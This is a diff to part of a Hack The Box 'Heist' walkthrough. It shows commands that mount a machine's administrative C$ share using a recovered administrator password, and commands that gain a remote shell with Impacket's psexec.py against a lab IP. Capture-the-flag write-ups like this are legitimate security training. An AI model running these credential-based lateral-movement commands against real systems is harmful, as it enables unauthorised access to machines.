@@ -178,9 +178,9 @@ $ net use r: \\SupportDesk\C$ /u:administrator "4dD!5}x/re8]FBuZ"
 $ r:
 ```
 ![flagrootlocally](https://github.com/roughiz/Heist-walktrough/blob/master/flagrootlocally.png)
-#### Fromoutput With psexec.ps
+#### From output With psexec.ps(Impacket)
 ```
-psexec.py SupportDesk/Administrator@10.10.10.149 -service-name LUALL.exe
+$ psexec.py SupportDesk/Administrator@10.10.10.149 -service-name LUALL.exe
 ```
  ![flagrootpsexec](https://github.com/roughiz/Heist-walktrough/blob/master/psexec.png)
 ### Nota : 
